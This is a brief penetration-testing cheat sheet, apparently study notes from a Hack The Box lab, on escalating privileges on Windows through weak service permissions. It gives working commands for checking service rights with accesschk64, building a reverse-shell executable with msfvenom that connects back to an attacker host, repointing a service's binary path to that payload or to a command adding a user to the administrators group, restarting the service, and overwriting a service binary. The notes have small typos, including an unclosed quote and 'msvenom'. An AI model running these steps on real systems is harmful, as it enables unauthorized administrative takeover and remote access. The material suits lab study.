
Check `accesschk64` if we have privileges over a process

https://learn.microsoft.com/it-it/sysinternals/downloads/accesschk

```
.\accesschk64.exe /accepteula -uwcqv <SimpleService?
```

create a rev shell
```
msvenom -p windows/shell_reverse_tcp LHOST=$ip -f exe -o malicious.exe
```

Change service binary path
```sh

sc config WindscribeService binpath="C:\Mal.exe

OR 
#execute a command

sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```

turn off and on the service 
```
sc stop WindscribeService
sc start WindscribeService
```


**This attack can be replicated also with Binary** 

execute winPEAS  to basically check got modifiable binaries that have interesting privs 

we can overwrite the service binary
```
cp .\simpleService.exe .\simple.exe.back
cp .\mal.exe .\simpleService.exe
```



